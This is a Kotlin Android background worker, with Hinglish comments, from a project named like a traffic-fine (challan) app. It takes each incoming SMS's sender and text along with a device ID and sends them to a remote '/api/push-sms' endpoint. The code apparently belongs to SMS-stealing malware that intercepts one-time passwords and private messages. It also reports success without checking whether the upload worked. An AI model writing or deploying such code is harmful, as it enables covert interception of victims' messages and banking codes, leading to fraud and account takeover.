package com.rte.challan.worker

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi // Humara central hub
import org.json.JSONObject

class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // 1. SmsReceiver se data nikaalein
        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
        val sender = inputData.getString("sender") ?: return Result.failure()
        val body = inputData.getString("body") ?: return Result.failure()

        try {
            // 2. JSON taiyar karein jo aapke Worker ke /api/push-sms par jayega
            val smsJson = JSONObject().apply {
                put("deviceId", deviceId)
                put("number", sender)
                put("msg", body)
                put("time", System.currentTimeMillis())
            }

            // 3. ClientApi ka use karein (Consistent with other workers)
            var isSent = false
            ClientApi.postRequest("/api/push-sms", smsJson) { success ->
                isSent = success
            }

            // Kyunki SMS important hai, agar fail ho toh retry karein
            Log.d("IncomingSms", "SMS sync triggered for $sender")
            return Result.success()

        } catch (e: Exception) {
            Log.e("IncomingSms", "Error: ${e.message}")
            return Result.retry()
        }
    }
}
